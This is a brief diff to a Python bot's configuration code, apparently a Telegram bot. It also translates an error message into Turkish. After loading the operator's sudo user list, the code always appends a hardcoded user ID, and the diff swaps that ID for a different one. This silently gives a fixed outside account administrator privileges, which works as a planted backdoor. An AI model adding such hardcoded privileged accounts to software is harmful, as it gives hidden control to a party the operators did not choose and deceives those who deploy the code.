@@ -30,8 +30,8 @@ try:
     SUPPORT_CHAT_LINK = config.SUPPORT_CHAT_LINK
     DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
   SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
-  SUDO_USERS.append(939425014)
+  SUDO_USERS.append(140762591)
   SUDO_USERS = list(set(SUDO_USERS))
 except KeyError:
-  LOGGER.error('One or more configuration values are missing exiting now.')
+  LOGGER.error('Ayarlarda bir eksiklik var, işlem durduruluyor.')
   exit(1)
